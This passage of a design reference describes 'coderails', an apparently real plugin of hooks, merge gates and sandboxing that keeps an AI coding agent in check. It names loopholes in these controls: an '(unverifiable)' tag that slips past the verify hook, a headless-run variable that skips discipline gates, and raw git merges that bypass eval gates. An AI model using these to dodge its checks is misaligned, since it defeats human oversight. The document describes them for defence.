  the turn. It keeps `timeout: 15` alongside `async`. Whether the runner still
  applies a timeout to a backgrounded hook is **not stated in the hooks
  documentation**; the timeout field is defined as "seconds before canceling"
  with no async exclusion, so the entry keeps it as a bound on a runaway
  background process. Do not remove it on the assumption it is dead config —
  that assumption is untested, and the cost of keeping it is zero.
- **`voice_announce`** shares its active-loop gating with `loop_state_guard`/`loop_stall_guard` (silent outside a registered, incomplete loop), but adds one more silence condition of its own: if stable text extraction comes back empty — no assistant text found, or every line in the tail window was malformed — it says nothing and logs `reason=extract_failed`, deliberately distinct from the stall announcement (empty extraction is "nothing to read yet," not "read it and it showed no declaration").
- **`enforce_pr_workflow`** is a no-op in any repo without `workflow.config.yaml`. It only kicks in once a project is initialised with `/coderails:init`.
- **Eval-gate coverage boundary**: the coderails eval artifact is ENFORCED at two points — `/coderails:merge` via `scripts/merge.sh` (config-independent, no opt-out) and raw `gh pr merge <N>` via this hook (config-dependent — inactive under `NO_CONFIG`, same as the rest of `enforce_pr_workflow`). It is NOT enforced on raw `git merge`/`git push` to main/master (the hook has no PR number to resolve a SHA-bound artifact against, so these stay review-gated only) or in any `NO_CONFIG` repo. **Documented residual, accepted not closed.**
- **Verification level-review gate coverage boundary**: the same two points additionally gate an eval artifact at every verification_level (not just verification_level 0) on a `integrity-review` commit status — `scripts/merge.sh` and this hook — both config-keyed on `integrity_review.machine_user` (absent/null by default, inactive) and both redundant with the server-side ruleset described in `AGENTS.md`'s enforcement-ceiling section when that ruleset is active. Like the eval gate above, it is NOT enforced on raw `git merge`/`git push` to main/master.
- **`test_gate`** requires an explicit opt-in file (`.claude/test_command`) per project. Run `/coderails:test-gate-setup` to configure it.
- **`destructive_bash_gate`** is a permanent block for everything on its blocklist, with one narrow conditional-allow carve-out: `git push --force-with-lease` is permitted (only when no naked `--force`/`-f` is also present) if the owner has opted in via an exact-line `git-push-force-with-lease` entry in `.claude/destructive_allowlist` — a per-keyword, per-checkout opt-in the owner controls, not a general approval path. Every other blocked pattern has no override besides a `settings.json` Bash permission rule added by the user.
- **`check_verify_loop`**: the `(unverifiable: <reason>)` tag is the only escape for a DNV bullet. Enforcement is independent of whether files were edited this turn — a DNV section in any response is policed. It is auditable — overuse is visible on review. Tagging a checkable item to avoid the block is the one thing the hook cannot catch.
- **Headless-run exemption (`check_confidence_labels`, `check_verify_loop`, `crack_on_prose_gate`)**: all three skip enforcement entirely when `CODERAILS_HEADLESS_RUN=1` is present in their process env. A headless `claude -p` run — the dashboard's run route — has no interactive turn left to satisfy a repair-turn block, so the gate would displace the run's answer with gate text instead of the response the user asked for. The scope is `Stop`-only in all three cases, reached two different ways: the two discipline hooks test `[ "$hook_event" = "Stop" ]` in the exemption block itself, so `SubagentStop`/worker output stays block-enforced; `crack_on_prose_gate` needs no such test because it hard-exits on any non-`Stop` event at the top of the script. A headless run's spawned subagents therefore get no pass. **The variable is set in exactly one place** — `skills/dashboard/app/src/app/api/run/route.ts`'s `spawn(...)` call — and per `AGENTS.md` must never be set anywhere else: an agent session setting it on itself to dodge the discipline gates is a self-inflicted trust violation, and any PR introducing a second set-site should be treated as a security finding. `scripts/sandbox/spawn-sandboxed-worker.sh` force-unsets it regardless of any inherited value for that reason. Like every local gate this sits inside the agent trust domain; the single-set-site rule is what bounds the ceiling rather than leaving it open.
- **Loop-scoped warn demotion (`check_confidence_labels`, `check_verify_loop`)**: both hooks' `Stop`-event block demotes to a model-visible warn while the agentic-loop Skill has been invoked for the session and the loop is not yet complete (`als_loop_active_incomplete` in `hooks/scripts/lib/loop_state_common.sh`, composed from the same primitives `loop_state_guard`/`loop_stall_guard` already use) — this fires as soon as the Skill invocation appears in the transcript, even before `progress.json` has been stubbed, so "registered" (implying the stub already exists) understates the trigger. The predicate is evaluated lazily — only once a block is otherwise imminent — so a non-loop session pays no added transcript-scan cost. `SubagentStop` is excluded from the demotion entirely (checked before the predicate ever runs): a warn at a worker's final stop has no next turn to self-correct, so workers stay block-enforced regardless of loop state. The demoted-path log line records `would_block=1 warned=1 blocked=0` (not `blocked=1`), so `dc_mine_hook_blocks` still classifies it as flagged ceremony pressure rather than reporting it silently cured. Fail-toward-blocking: the warn's `jq` emission is checked for success before the log line/exit-0 path runs — a failed emission falls through to the normal block instead of silently exiting 0 with no warning delivered.

### Hook library files

| File | Purpose | Consumers |
|---|---|---|
| `hooks/scripts/lib/discipline_common.sh` | Shared transcript-extraction utilities, grouped by purpose. **Extraction:** `dc_extract_last_text`, `dc_stable_text` (with retry-backoff for the transcript-flush race), `dc_file_count` (turn-scoped unique-edit count). **Log mining:** `dc_mine_hook_blocks` (aggregates this session's discipline-log lines per hook into `{"<hook>":{"events":N,"flagged":M}}`, fail-open to `{}` — its fail-open idiom is mirrored by `loop_cost.sh`'s token-usage miner) | `check_confidence_labels.sh`, `check_verify_loop.sh`, `offload_push_guard.sh` |
| `hooks/scripts/lib/loop_state_common.sh` | Shared agentic-loop detection, grouped by purpose. **Detection primitives:** `LOOP_STOP_VOCAB`, `als_log`, `als_sanitise_session_id`, `als_count_invocations`, `als_stable_invocations`, `als_extract_last_text`/`als_stable_last_text` (stable last-assistant-text extraction, retry-backoff for the transcript-flush race — mirrors `discipline_common.sh`'s `dc_extract_last_text`/`dc_stable_text`), `als_loop_active_incomplete` (non-exiting predicate: true iff the agentic-loop Skill was invoked this session and the loop is not yet complete — the loop-scoped warn-demotion condition). **State readers:** `als_resolve_path`, `als_read_file_state`, `als_read_work_units`, `als_read_loop_evals_result` (validates a loop-scope `evals.json`'s GO/NO-GO/VERIFICATION_LEVEL0/UNSTAMPED/UNJUSTIFIED result, including the grading-checksum re-derivation that catches a forged or stale stamp). **Per-hook entry gates** (fail-open skips shared by every `Stop`-event hook, in call order): `als_gate_no_transcript`, `als_gate_stop_loop`, `als_gate_require_active_loop`, `als_load_progress`, `als_gate_unstubbed_grace` (nag-once grace: when `progress.json` is absent, stands down — exit 0 — after one delivered absent-`progress.json` block for the same session + invocation count, instead of blocking every stop), `als_gate_loop_complete`. **Complete-declaration gates** (fire only on a `complete` category, `loop_stall_guard.sh`-only): `als_gate_retro_on_complete` (blocks unless `retro.json` exists and parses with `schema_version >= 1`), `als_gate_work_units_on_complete` (blocks unless every `progress.json` work unit is terminal — `done`, or `dropped` with a non-empty reason), `als_gate_proofs_on_complete` (blocks on a malformed `proof.json`, or any proof entry that is unexecuted or last-failed). **Reporting:** `als_report_cost_on_complete` (prints the loop's mined cost — USD, tokens, price-staleness age — from `retro.json` on `complete`, `schema_version >= 2` only). | `loop_state_guard.sh`, `loop_stall_guard.sh`, `unregistered_loop_guard.sh`, `voice_announce.sh`, `offload_push_guard.sh` (uses `als_log`/`als_sanitise_session_id` only), `check_confidence_labels.sh`/`check_verify_loop.sh` (via `als_loop_active_incomplete`/`als_sanitise_session_id` only) |
| `hooks/scripts/lib/agentic_loop_path.sh` | Sole authority for the `progress.json` path. Computes `<base>/<slug>/<session_id>/progress.json` where slug is keyed to the repo's `git --git-common-dir` (absolute path, validated; shared across a repo's worktrees) when cwd is inside a git repo, falling back to cwd with `/` replaced by `-` on any git failure or non-absolute output; session_id defaults to `$CLAUDE_CODE_SESSION_ID` (falling back to a unique generated value when unavailable). Resolution: prints the canonical slug path when state exists there or when no state exists anywhere (fresh registration); otherwise probes `<base>/*/<session_id>/progress.json` and prints state a prior helper version or a mid-loop cwd/repo-ness drift parked under a different slug (session_id is unique per session; matches deduped by physical dir identity for the orchestrator's workaround symlinks, deterministic pick if distinct real files exist) — this heals the 2026-07-08 split-slug incident where a loop registered under one slug but read back under another, blinding the Stop guards. Never called directly by Claude — always run via Bash to get the path. | `loop_state_common.sh` (via `als_resolve_path`), the agentic-loop orchestrator (to get the write path) |
| `hooks/scripts/lib/loop_cost.sh` | Exposes `dc_mine_token_usage <session_id>` — mines token usage across an orchestrator session's transcript plus every worker (subagent) transcript it spawned, dedupes by `message.id`, sums per-model token usage, and prices it via `hooks/scripts/lib/model_prices.json` (override `CLAUDE_MODEL_PRICES_FILE`). Returns a single JSON object (`schema_version` 1: `per_model`, `total_tokens`, `total_usd_estimate`, `models_used`, `unpriced_models`, `headless_children_excluded_count` — a count of headless `claude -p` child sessions detected but excluded from the totals for lack of a sound attribution path). Fail-open on any error — never blocks a caller, mirroring `dc_mine_hook_blocks`'s idiom. Five environmental causes (no jq, unreadable transcripts, missing/invalid price file) return a bare `{}`; two caller errors (no session id argument, or a session id that resolves to no transcript anywhere under the projects dir) instead return a self-describing `{"error":...,"hint":...}` on stdout, so they survive `2>/dev/null` and aren't mistaken for a successful-but-empty mine. | agentic-loop orchestrator (Phase 13 teardown, cost-mining sub-step) |
| `hooks/scripts/lib/graph_readiness.sh` | Pure read-only readiness query over `progress.json`'s durable execution graph (see `skills/agentic-loop/loop-state.md`'s `graph` field docs and `SKILL.md`'s "Execution graph" section). `graph_readiness.sh <path-to-progress.json> <node-id>` prints `ready`/`blocked` and exits 0/1: ready iff every incoming edge's source outcome is terminal-success (`done`/`skipped`), or, for a `mode:"all"` join target, iff every listed join input is terminal-success; fails closed (`blocked`, exit 1) on any missing-arg, missing-file, or unparseable-JSON case. Never writes `progress.json` — the orchestrator remains the sole writer of graph state. | Its own test suite (`hooks/scripts/tests/graph_readiness.test.sh`, `graph_two_unit_fanout.test.sh`); `SKILL.md`'s "Execution graph" section now instructs the orchestrator to call it before dispatching any candidate node (wiring `graph.nodes` to `work_units` remains a follow-up, per PR #380) |
| `hooks/scripts/lib/graph_executor.sh` | Wave collect-and-write for `progress.json`'s durable execution graph — per spec.md D1, collects an entire wave's results then performs exactly one locked read-modify-write via `als_atomic_progress_update`'s jq reduce filter, never one call per node; dispatch itself (spawning agents) is out of scope. Sourced-only, exposes two functions: `graph_executor_ready_nodes <progress.json path>` enumerates `graph.nodes` and prints one ready node-id per line by calling `graph_readiness.sh` for each, never writing, failing closed (exit 1, no stdout) only on a missing or unparseable file. `graph_executor_apply_wave <progress.json path> <wave-results JSON>` folds every node result into `.graph.nodes[node_id]` (merge — unspecified existing fields survive) and appends any `decisions_absorbed` entries in that one locked write; refuses (no write attempted) if the wave-results shape is malformed, names an unknown node id, or gives any node a status/outcome/retry violating `graph_contract.test.sh`'s own enum/retry predicate (lifted verbatim, so this guard can't drift weaker than the contract) — including a bare `stale` write lacking a same-wave `stale_check` object, since idle is not evidence. All validation runs inside the locked jq filter via `error(...)`, not a pre-lock read, to close a TOCTOU race against a concurrent writer. | Its own test suite (`hooks/scripts/tests/graph_executor.test.sh`, `graph_executor_concurrency.test.sh`, `graph_contract.test.sh`); `graph_executor_ready_nodes` calls `graph_readiness.sh` per node |
| `hooks/scripts/lib/skill_route.sh` | Routing resolution over `skills/index.yaml`: given a skill_id and a provider (`claude`/`codex`), resolves the provider-native path or fails closed. `skill_route.sh <path-to-index.yaml> <skill_id> <claude\|codex>` prints the resolved path and exits 0 on success; on any failure (skill_id not found, provider key absent, provider status not `active`, or an active provider with a null/empty path) prints `NO_PROVIDER_MAPPING: <reason>` and exits 1 — never falls back to another provider and never dispatches on a missing/ambiguous read. Not a general YAML parser: `skills/index.yaml` is machine-generated with a fixed, known indentation shape (2/4/6-space), so this extracts exactly the four fields routing needs via a small indentation-keyed `awk` extractor rather than a full parser. Resolves paths only — does not check the resolved path exists on disk or stays inside the repo's expected directories (that check is the caller's responsibility; see `hooks/scripts/lib/codex_dispatch.sh` below for the Codex-arm confinement + file-existence checks). | Its own test suite (`hooks/scripts/tests/skill_route.test.sh`, covering AC-2 through AC-5 of the provider-routed graph execution build: Claude/Codex resolution, missing-mapping and `planned`-status fail-closed behavior) |
| `hooks/scripts/lib/codex_dispatch.sh` | Unit 6 (AC-7 fixture half): the first real caller of `skill_route.sh`. `codex_dispatch_construct <path-to-index.yaml> <skill_id>` resolves the skill against the `codex` provider, then (1) resolves the path to its physical absolute form and confines it to one of `skills/`, `.codex/skills/`, `agents/`, `commands/` under the index file's own repo root — closing the path-confinement gap `skill_route.sh` deliberately left to this unit — (2) refuses a symlinked target outright (ponytail: blunt ban, not full symlink-target confinement), (3) verifies the confined path exists as a regular file, (4) maps `source_kind` (`skill`/`agent`; read from the index the same fixed-indentation `awk` way `skill_route.sh` does) to the Codex tool that would carry the dispatch per `skills/using-coderails/references/codex-tools.md` (`skill` -> `native`, `agent` -> `spawn_agent`; `command` has no documented mapping and is refused). On success prints a JSON descriptor (`{skill_id, provider, source_kind, codex_tool, resolved_path}`) and exits 0; on any failure — `skill_route.sh`'s own fail-closed passthrough, a confinement/existence/symlink refusal (`DISPATCH_REFUSED: ...`), or an unmapped `source_kind` — exits 1. Never spawns Codex or writes any file; scaffolding/fixture-construction only, live Codex execution is out of scope. | Its own fixture test suite (`hooks/scripts/tests/codex_dispatch.test.sh`) — real-index case (`disposition-scout`), skill_route fail-closed passthrough, and a fresh-`mktemp`-rooted fake-repo fixture covering traversal escape, absolute-path escape, in-repo-but-out-of-prefix, prefix-lookalike-directory, missing-file, symlink, and unmapped-`source_kind` cases |

---

## Commands

Commands are slash commands invoked by Claude (or the user via `/coderails:<name>`). They encode workflow logic but are **advisory** — Claude must choose to invoke them. Unlike hooks, commands cannot self-enforce.

| Command | Description | Key dependencies |
|---|---|---|
| `/coderails:workflow` | Orchestrate the full feature workflow: `prep → code → push → review → merge → wiki-ingest → wiki-lint`. Two interactive pauses: the code/iterate loop, and final ship-it authorisation. | Delegates to all other commands; reads `workflow.config.yaml`; requires `pr-review-toolkit` plugin for the review stage |
| `/coderails:prep` | Create a safety branch, a feature/bug branch, and optionally a Jira ticket. | `git worktree`, Jira MCP (optional — skips if `config.jira` is null or no Jira MCP); reads `workflow.config.yaml` |
| `/coderails:push` | Stage, commit, push changes, and create a PR. Runs an engineering-principles pre-flight if `config.engineering_principles_paths` is set. | Shells out to `scripts/push.sh`; requires a GitHub remote; reads `workflow.config.yaml` |
| `/coderails:post-review` | Post the SHA-bound review artifact as a GitHub PR comment. Validates the review summary structure, then posts a machine-marked comment. The `/merge` gate requires this artifact for the current head SHA — fail-closed. | Shells out to `scripts/post_review.sh`; sources `scripts/lib/review-artifact.sh` inline to build the marker; uses `gh api` (not `gh pr comment`) to capture the returned comment URL; best-effort cache write to `progress.json` if it exists |
| `/coderails:post-evals` | Validate and post the SHA-bound eval-artifact summary as a GitHub PR comment. Consumes the `evals.json` produced by `/coderails:task-evals` for this PR, computes `GO`/`NO-GO` (never hand-written), and posts a machine-marked comment. The `/merge` gate requires this artifact for the current head SHA — fail-closed, additive to the review-artifact gate. | Shells out to `scripts/post_evals.sh`; sources `scripts/lib/eval-artifact.sh` inline to build the marker |
| `/coderails:merge` | Merge an approved PR, switch to main, and pull latest. Requires a coderails review artifact AND a coderails eval artifact on the PR for the current head SHA before merging, and — where the repo config activates it (`wiki_debt_epoch_pr` + `wiki_path`) — a wiki-ingest debt check (`has_wiki_ingest_for_merged_prs`) that greps the wiki vault's `origin/main` for coverage of every PR merged after the epoch. | Shells out to `scripts/merge.sh`; requires GitHub remote; checks PR approval if branch protection is on; fetches live PR comments for both the review-artifact gate and the eval-artifact gate |
| `/coderails:init` | Scaffold a `workflow.config.yaml` for the current project. Writes to `$(pwd)/.claude/` (resolved by walk-up — see Config resolution). | `git rev-parse`, Write tool; idempotent — confirms before overwriting |
| `/coderails:test-gate-setup` | Configure the test gate for the current project. Detects the test runner (npm, cargo, pytest, go test, etc.) and writes `.claude/test_command`. | Write tool; opt-in gate for `test_gate.sh` hook |
| `/coderails:assumptions` | List every assumption currently being made (task, codebase, environment, state), marked `(verified)` or `(inferred)`. Pure inventory — does no other work. | None |
| `/coderails:disconfirm` | Argue against the most recent recommendation — find the strongest case it is wrong. Steelmans the opposition. | None |
| `/coderails:cite-check` (skill at `skills/cite-check/`, not a `commands/` file) | Re-derive a specific claim from durable sources only (file contents, git output, fresh command output). No recall, no inference. Runs `context: fork` into `coderails:source-auditor` with `background: false`, so the audit has no access to the conversation that produced the claim — verifying inside that context would be self-verification. Named `cite-check` rather than `verify` because `/verify` is a Claude Code bundled skill and a same-named project skill would override it. | `coderails:source-auditor` agent |
| `/coderails:notchecked` | Review recent responses and list every non-trivial claim that was NOT verified. Surface gaps ruthlessly. | None |

### Config resolution (shared by `workflow`, `prep`, `push`, `init`)

Every workflow command reads `workflow.config.yaml` via a shared resolver sourced from `scripts/lib/config.sh`:

```bash
source "${CLAUDE_PLUGIN_ROOT}/scripts/lib/config.sh" && coderails::resolve_config
```

`coderails::config_path [dir]` walks up from `dir` (default `$PWD`) to the git root — the first `.claude/workflow.config.yaml` found wins, empty if none; `coderails::resolve_config` echoes its contents or `NO_CONFIG`. Layout-agnostic: standalone repos, classic `projects/<name>/` monorepos, and arbitrary layouts (`apps/web`, `services/api`, …) all resolve from any subdir. The same resolver is sourced by `scripts/merge.sh` and `gate_config_present()` in `hooks/scripts/enforce_pr_workflow.sh`. `NO_CONFIG` is the sentinel for "not initialised." All workflow commands degrade gracefully: Jira steps no-op, wiki steps skip, engineering-principles pre-flight skips, `enforce_pr_workflow` hook is inactive.

---

## Scripts and Libraries

| File | Purpose | Consumers |
|---|---|---|
| `scripts/push.sh` | Stage tracked changes (`git add -u`) plus any caller-named new files passed via repeatable `--add <path>` flags; warns about any other untracked files instead of staging them. Commits (prefixing Jira key if set), pushes, and creates or updates a PR via `gh`. Detects whether a PR already exists and comments on it rather than creating a duplicate. | `/coderails:push` command (shells out to it) |
| `scripts/merge.sh` | Resolve a PR from a number, branch name, or current branch; check review/eval/smoke evidence and, when configured, require the newest SHA-bound `integrity-review` status from the configured machine user; merge via `gh pr merge --merge`; switch to main; pull; clean up the remote branch (best-effort, non-fatal). | `/coderails:merge` command (shells out to it) |
| `scripts/lib/git-common.sh` | Shared bash utilities: terminal colour helpers (`ok`, `warn`, `err`, `step`, `banner`); git core helpers (`branch`, `dirty`, `main`, `ahead`, `ahead_list`); repository helpers (`repo`, `protected`); PR helpers (`pr::num`, `pr::url`, `pr::state`, `pr::title`, `pr::review`, `pr::exists`); guards (`require::feature`, `require::clean`, `require::repo`); review-gate helpers (`pr::head_sha`, `pr::has_coderails_review_for_head`). | `scripts/push.sh`, `scripts/merge.sh` (both `source` it) |
| `scripts/post_review.sh` | Summary grammar validator and progress.json cache writer for `/coderails:post-review`. Exposes `validate`/`write-cache` subcommands. Called as a subprocess by `commands/post-review.md`. | `/coderails:post-review` command |
| `scripts/lib/review-artifact.sh` | SSOT for the coderails review artifact marker: `review_artifact::marker <pr> <sha>` (builds the exact marker string), `review_artifact::matches_marker <line> <pr> <sha>` (exact-equality match). Both `/post-review` (writer) and `/merge` (reader) source this lib — no literal marker duplication. | `scripts/post_review.sh`, `scripts/merge.sh` (via `git-common.sh`) |
| `scripts/lib/eval-artifact.sh` | SSOT for the coderails eval artifact marker, grouped by purpose. **Construction:** `eval_artifact::marker <pr> <head_sha> <result> <verification_level>` (builds the exact marker string). **Parsing:** `eval_artifact::matches_marker` (literal prefix string-equality, never a regex over untrusted pr/sha — fail-closed on an unknown version or malformed grammar; delegates its shared prefix to the private `eval_artifact::_prefix` helper), `eval_artifact::parse_result`, `eval_artifact::parse_verification_level`. **Result derivation:** `eval_artifact::compute_go` (the only place a `GO`/`NO-GO` result is derived). **Provenance:** `eval_artifact::grading_checksum` (computes the sha256 checksum `grade-loop` stamps into a loop-scope artifact's `grading` field). Source-only — mirrors `review-artifact.sh`. Both `/post-evals` (writer) and `/merge` (reader) source this lib. | `scripts/post_evals.sh`, `scripts/merge.sh`, `hooks/scripts/lib/loop_state_common.sh` (sources it for `grading_checksum` in the UNSTAMPED check) |
| `scripts/post_evals.sh` | Structural validator and result computer for `/coderails:post-evals`. `post_evals::validate_structure` runs anti-gaming structural refusals (schema, frozen-SHA match, verification_level/priority shape, and other gaming checks) in order, first failure wins; `post_evals::compute_and_validate_result` echoes `GO`/`NO-GO` by calling `eval_artifact::compute_go` — never read from a caller-supplied field. A `grade-loop` subcommand is the sole neutral computer of a loop-scope artifact's `result`: validates the loop-variant structure, computes `result` via the same `eval_artifact::compute_go`, and atomically stamps `result`/`graded_at`/`grading: {by, checksum}` — closes the gap where an orchestrator could otherwise hand-write its own loop-scope `GO`. `loop_state_guard.sh` demotes a `GO`/`VERIFICATION_LEVEL0` verdict lacking a valid stamp to `UNSTAMPED` and blocks. A `validate-discriminating` subcommand (`post_evals::validate_discriminating`) is the discriminating-check gate: for every scripted eval carrying an optional `fixtures` object (`{good, bad, formula?}`), it mechanically pipes both fixtures into the formula and requires opposite exit codes, rejecting non-discriminating or malformed checks by name; evals without `fixtures` are grandfathered and untouched — see `skills/task-evals/SKILL.md`'s "Discriminating-check gate" section. | `/coderails:post-evals` command (pr scope, writer path — Step 3b); orchestrator runs `grade-loop` at loop scope (prompted by `loop_state_guard.sh`'s block message — the hook echoes the command but never invokes it) |
| `scripts/sandbox/spawn-sandboxed-worker.sh` | Launches a headless `claude -p` worker wrapped by `@anthropic-ai/sandbox-runtime` (srt, version-pinned at `SRT_VERSION=0.0.65`). Resolves the primary repo's `.git` (not the worktree's own pointer file), obtains a `gh auth token` outside the sandbox (the worker itself must call GitHub via `curl`, never `gh`, since srt breaks its TLS stack), creates a per-worker scratch dir under `$TMPDIR`, renders sandbox settings via `render-settings.sh`, then execs the worker inside srt so its filesystem writes are OS-contained to an explicit per-worker `allowWrite` list — worktree, scratch, primary `.git` (with `.git/hooks` and `.git/config` separately denied to close a worktree-topology escape), `$TMPDIR`, and a narrowed slice of `~/.claude` (config state only; `~/.claude/hooks`, `~/.claude/plugins`, and the two settings files stay denied) — a named residual, not full claude-home exclusion. Not a hook guard — fails fast and loudly (`set -euo pipefail`) rather than failing open. | agentic-loop orchestrator, Phase 3/3a, when `config.sandbox_workers: true` |
| `scripts/sandbox/render-settings.sh` | Renders the pinned srt settings template (`srt-settings.json.template`) into a per-worker settings file: substitutes `%%WORKTREE%%`, `%%SCRATCH%%`, `%%PRIMARY_GIT%%`, `%%HOME%%`, `%%TMPDIR%%`, and `%%CLAUDE_PROJECT_STATE%%`, strips the template's `//` comments (srt parses with `JSON.parse`, which rejects them), and validates the result with `jq` before writing. | `scripts/sandbox/spawn-sandboxed-worker.sh` |
| `scripts/sandbox/sandbox-probe.sh` | First-class negative control proving a probe run discriminates the sandbox, not merely the filesystem. Writes then deletes `<worktree>/.sandbox-probe` (must succeed — inside the allowlist), then attempts `$HOME/.sandbox-escape-probe` and `<primary-repo-parent>/escape-probe` (both must fail — outside the allowlist). Exit 0 iff the inside write succeeded and both outside attempts failed; exit 1 with a named reason otherwise; exit 2 ("not sandboxed?") when an outside write unexpectedly succeeds, i.e. run bare outside srt. | Sandbox-workers eval harness (manual or CI verification that containment holds) |
| `scripts/integrity-gate/integrity-gate-runner.sh` | Root daemon: polls open PRs, validates current-head review/eval evidence, checks JSON provenance, policy paths, and a bounded real diff, then posts an `integrity-review` status as the machine-user identity. It never invokes an LLM or classifies verification levels. GitHub reads/writes route through root-pinned `curl`. | `com.coderails.integrity-gate.plist.template` (launchd, installed by `install.sh`); status consumed by `scripts/merge.sh`/`enforce_pr_workflow.sh` |
| `scripts/integrity-gate/install.sh` | Installs the mechanical integrity daemon: preflights `gh`/`jq`/`curl`, `GH_TOKEN` + `MACHINE_USER`, ruleset visibility, and the runner promotion diff; sudo-installs the plist, root-owned credentials, and runner. | Run manually by the repo owner to (re)install/update the daemon |
| `scripts/integrity-gate/setup.sh` | Owner-run, product-neutral setup helper: creates or verifies the protected GitHub `coderails-integrity-review` ruleset on `main` (refusing to overwrite a same-name policy that differs), collects and validates the machine-user token, then invokes `install.sh` under `sudo` to install the daemon. | Printed by the repository `install.sh` for the owner to run manually; never invoked automatically |

### `require::repo` constraint

`push.sh` calls `require::repo` which validates that the git remote is on `github.com`. Repos on other hosts (GitLab, Bitbucket, self-hosted) will fail at push time.

---

## Artifact and State Locations

| Artifact | Location | Committed? | Notes |
|---|---|---|---|
| `workflow.config.yaml` | first `.claude/workflow.config.yaml` found walking from cwd up to git root (`$(pwd)/.claude/` for `/init`) | Yes | Project-specific config for jira, wiki, worktree, engineering-principles. Created by `/coderails:init`. |
| `.claude/test_command` | Project working directory | Yes (project-local) | Plain-text file containing the test command. Created by `/coderails:test-gate-setup`. Activates `test_gate.sh`. |
| Specs from brainstorming | Session-local scratch path (`docs/coderails/specs/` is gitignored) | No — ephemeral, never tracked | Written by `superpowers:brainstorming` after design resolution. Owner decision 2026-07-11: use `coderails:handoff` or a wiki page for a durable record instead. |
| Plans from writing-plans | Session-local scratch path (`docs/coderails/plans/` is gitignored) | No — ephemeral, never tracked | Written by `superpowers:writing-plans`. Same owner decision, 2026-07-11. |
| Agentic loop `progress.json` | `~/.coderails/agentic-loop/<repo-or-cwd-slug>/<session_id>/progress.json` | No — ephemeral loop state, outside the repo | Dynamic position tracker for the loop. Path computed by `agentic_loop_path.sh` — keyed to the repo (shared across its worktrees) when cwd is inside a git repo, falling back to cwd otherwise. Session-keyed. When the canonical slug has no file, the helper probes `<base>/*/<session_id>/progress.json` so state written under a different slug (older helper version, mid-loop cwd drift) is still found by session_id. |
| Agentic loop `spec.md` | Same dir as `progress.json` | No — ephemeral loop state | Written by the agentic-loop orchestrator for ≥3-unit loops. Not a PR deliverable. |
| Agentic loop `plan.md` | Same dir as `progress.json` | No — ephemeral loop state | Written by `superpowers:writing-plans` as invoked by the agentic-loop. Consumed, not write-only: the orchestrator re-reads it after compaction to recover scope. |
| `evals.json` (pr scope) | Working material only — no fixed path; wherever the invoking workflow placed it (e.g. current working tree or a path named in the worker prompt) | No — the durable artifact is the SHA-bound `coderails-eval-summary` PR comment, not this file | Generated and frozen per PR; validated and posted by `/coderails:post-evals` via `scripts/post_evals.sh` + `scripts/lib/eval-artifact.sh`. |
| `evals.json` (loop scope) | Same dir as `progress.json` | No — ephemeral loop state | Read by the `loop_state_guard.sh` hook when `progress.json`'s `work_units` ≥ 3; blocks `Stop` if absent. |
| Discipline log | `~/.claude/discipline.log` (or `$CLAUDE_DISCIPLINE_LOG`) | No | Structured `key=value` log appended by hooks on every fire. Never committed. |
| LLM Wiki vault | `config.wiki_path` (set in `workflow.config.yaml`) | Separate repo/vault | Maintained by `wiki-ingest`, `wiki-lint`, `wiki-query`. Browsed in Obsidian. |

### The ephemeral vs committed boundary

The loop's `spec.md`, `plan.md`, and `progress.json` live in `~/.coderails/agentic-loop/` — **outside** the code repo and Claude's configuration tree. They are loop state keyed to this orchestrator run, not shareable design records. If work needs handing to a human, `coderails:handoff` is the right tool. Committed artifacts (`superpowers:brainstorming` specs, `superpowers:writing-plans` plans) live in `docs/coderails/` inside the repo and are permanent.
